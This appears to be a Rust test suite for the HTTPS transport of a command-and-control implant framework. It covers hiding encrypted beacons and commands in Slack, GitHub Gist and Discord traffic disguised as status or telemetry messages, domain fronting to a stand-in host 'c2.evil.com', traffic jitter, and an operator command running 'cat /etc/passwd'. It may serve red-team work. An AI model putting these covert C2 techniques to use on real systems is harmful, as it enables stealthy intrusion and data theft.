use super::*;
use crate::c2_protocol::{
    BeaconMessage, C2Message, CommandMessage, CommandType, PayloadType, SessionCipher,
};

fn test_beacon() -> BeaconMessage {
    BeaconMessage {
        implant_id: "imp-https-01".to_string(),
        timestamp: 1700000000,
        hostname: "target-web".to_string(),
        username: "www-data".to_string(),
        os: "Ubuntu 22.04".to_string(),
        ip: "10.0.0.5".to_string(),
        payload_type: PayloadType::Checkin,
        data: b"alive".to_vec(),
    }
}

fn test_command() -> CommandMessage {
    CommandMessage {
        command_id: "hcmd-001".to_string(),
        implant_id: "imp-https-01".to_string(),
        command_type: CommandType::Shell,
        args: vec!["cat /etc/passwd".to_string()],
        timeout_secs: 30,
    }
}

fn slack_config() -> HttpsC2Config {
    HttpsC2Config {
        provider: SaasProvider::Slack,
        webhook_url: "https://hooks.slack.com/test".to_string(),
        poll_url: "https://slack.com/api/test".to_string(),
        polling_interval_ms: 1000,
        domain_fronting: None,
        jitter_pct: 0.1,
    }
}

fn gist_config() -> HttpsC2Config {
    HttpsC2Config {
        provider: SaasProvider::GithubGist,
        webhook_url: "https://api.github.com/gists/test".to_string(),
        poll_url: "https://gist.githubusercontent.com/test".to_string(),
        polling_interval_ms: 5000,
        domain_fronting: None,
        jitter_pct: 0.15,
    }
}

fn discord_config() -> HttpsC2Config {
    HttpsC2Config {
        provider: SaasProvider::Discord,
        webhook_url: "https://discord.com/api/webhooks/test".to_string(),
        poll_url: "https://discord.com/api/channels/test".to_string(),
        polling_interval_ms: 2000,
        domain_fronting: None,
        jitter_pct: 0.2,
    }
}

#[test]
fn test_slack_encode_decode_roundtrip() {
    let key = SessionCipher::generate_key();
    let cipher = SessionCipher::new(&key);
    let beacon = test_beacon();
    let msg = C2Message::Beacon(beacon);

    let json = encode_slack_message(&msg, &cipher).expect("encode");
    assert!(json.contains("status update:"));

    let decoded = decode_slack_message(&json, &cipher).expect("decode");
    match decoded {
        C2Message::Beacon(b) => {
            assert_eq!(b.implant_id, "imp-https-01");
            assert_eq!(b.hostname, "target-web");
        }
        _ => panic!("expected Beacon"),
    }
}

#[test]
fn test_gist_encode_decode_roundtrip() {
    let key = SessionCipher::generate_key();
    let cipher = SessionCipher::new(&key);
    let msg = C2Message::Command(test_command());

    let content = encode_gist_content(&msg, &cipher).expect("encode");
    assert!(content.contains("# config v2.1"));
    assert!(content.contains("data="));

    let decoded = decode_gist_content(&content, &cipher).expect("decode");
    match decoded {
        C2Message::Command(c) => {
            assert_eq!(c.command_id, "hcmd-001");
            assert_eq!(c.command_type, CommandType::Shell);
        }
        _ => panic!("expected Command"),
    }
}

#[test]
fn test_discord_encode_decode_roundtrip() {
    let key = SessionCipher::generate_key();
    let cipher = SessionCipher::new(&key);
    let msg = C2Message::Beacon(test_beacon());

    let json = encode_discord_message(&msg, &cipher).expect("encode");
    assert!(json.contains("System Monitor"));
    assert!(json.contains("telemetry"));

    let decoded = decode_discord_message(&json, &cipher).expect("decode");
    match decoded {
        C2Message::Beacon(b) => {
            assert_eq!(b.implant_id, "imp-https-01");
        }
        _ => panic!("expected Beacon"),
    }
}

#[test]
fn test_slack_wrong_key_fails() {
    let key1 = SessionCipher::generate_key();
    let key2 = SessionCipher::generate_key();
    let cipher1 = SessionCipher::new(&key1);
    let cipher2 = SessionCipher::new(&key2);
    let msg = C2Message::Beacon(test_beacon());

    let json = encode_slack_message(&msg, &cipher1).expect("encode");
    assert!(decode_slack_message(&json, &cipher2).is_err());
}

#[test]
fn test_domain_front_headers() {
    let config = DomainFrontConfig {
        front_domain: "cdn.cloudflare.com".to_string(),
        actual_host: "c2.evil.com".to_string(),
        path_prefix: "/api/v1/".to_string(),
    };
    let headers = build_domain_front_headers(&config);
    let host = headers.iter().find(|(k, _)| k == "Host");
    assert_eq!(host.expect("Host header").1, "c2.evil.com");
    let ua = headers.iter().find(|(k, _)| k == "User-Agent");
    assert!(ua.expect("UA header").1.contains("Mozilla"));
}

#[test]
fn test_browsing_delay() {
    let delay = browsing_delay_ms(1000, 0.2);
    assert!(delay >= 800);
    assert!(delay <= 1200);
    let no_jitter = browsing_delay_ms(1000, 0.0);
    assert_eq!(no_jitter, 1000);
}

#[test]
fn test_mock_http_server_webhook() {
    let server = MockHttpServer::new();
    assert!(server.poll_message().is_none());
    server.post_webhook("msg1");
    server.post_webhook("msg2");
    assert_eq!(server.pending_count(), 2);
    assert_eq!(server.poll_message().as_deref(), Some("msg1"));
    assert_eq!(server.poll_message().as_deref(), Some("msg2"));
    assert!(server.poll_message().is_none());
}

#[test]
fn test_mock_http_server_gist() {
    let server = MockHttpServer::new();
    assert!(server.read_gist().is_none());
    server.update_gist("content v1");
    assert_eq!(server.read_gist().as_deref(), Some("content v1"));
    server.update_gist("content v2");
    assert_eq!(server.read_gist().as_deref(), Some("content v2"));
}

#[test]
fn test_slack_client_server_full_flow() {
    let key = SessionCipher::generate_key();
    let http = MockHttpServer::new();
    let config = slack_config();

    let client = HttpsC2Client::new(config.clone(), &key, http.clone());
    let mut server = HttpsC2Server::new(config, &key, http);

    // Implant sends beacon
    let beacon_msg = C2Message::Beacon(test_beacon());
    client.send_beacon(&beacon_msg).expect("send");

    // Operator receives it
    let received = server.poll_beacon().expect("poll").expect("has msg");
    match received {
        C2Message::Beacon(b) => assert_eq!(b.implant_id, "imp-https-01"),
        _ => panic!("expected beacon"),
    }

    // Operator sends command
    server.send_command(&test_command()).expect("send cmd");

    // Implant receives command
    let cmd = client.poll_command().expect("poll").expect("has cmd");
    assert_eq!(cmd.command_id, "hcmd-001");
}

#[test]
fn test_gist_client_server_flow() {
    let key = SessionCipher::generate_key();
    let http = MockHttpServer::new();
    let config = gist_config();

    let client = HttpsC2Client::new(config.clone(), &key, http.clone());
    let mut server = HttpsC2Server::new(config, &key, http);

    let beacon_msg = C2Message::Beacon(test_beacon());
    client.send_beacon(&beacon_msg).expect("send");

    let received = server.poll_beacon().expect("poll").expect("has msg");
    match received {
        C2Message::Beacon(b) => assert_eq!(b.hostname, "target-web"),
        _ => panic!("expected beacon"),
    }
}

#[test]
fn test_discord_client_server_flow() {
    let key = SessionCipher::generate_key();
    let http = MockHttpServer::new();
    let config = discord_config();

    let client = HttpsC2Client::new(config.clone(), &key, http.clone());
    let mut server = HttpsC2Server::new(config, &key, http);

    let beacon_msg = C2Message::Beacon(test_beacon());
    client.send_beacon(&beacon_msg).expect("send");

    let received = server.poll_beacon().expect("poll").expect("has msg");
    match received {
        C2Message::Beacon(b) => assert_eq!(b.os, "Ubuntu 22.04"),
        _ => panic!("expected beacon"),
    }
}

#[test]
fn test_saas_provider_display() {
    assert_eq!(SaasProvider::Slack.to_string(), "Slack");
    assert_eq!(SaasProvider::GithubGist.to_string(), "GitHub Gist");
    assert_eq!(SaasProvider::Discord.to_string(), "Discord");
}

#[test]
fn test_https_c2_error_display() {
    let e = HttpsC2Error::NoMessages;
    assert!(e.to_string().contains("no messages"));
    let e2 = HttpsC2Error::ProviderUnavailable(SaasProvider::Slack);
    assert!(e2.to_string().contains("Slack"));
}

#[test]
fn test_config_default() {
    let config = HttpsC2Config::default();
    assert_eq!(config.provider, SaasProvider::Slack);
    assert_eq!(config.polling_interval_ms, 30_000);
    assert!(config.domain_fronting.is_none());
}
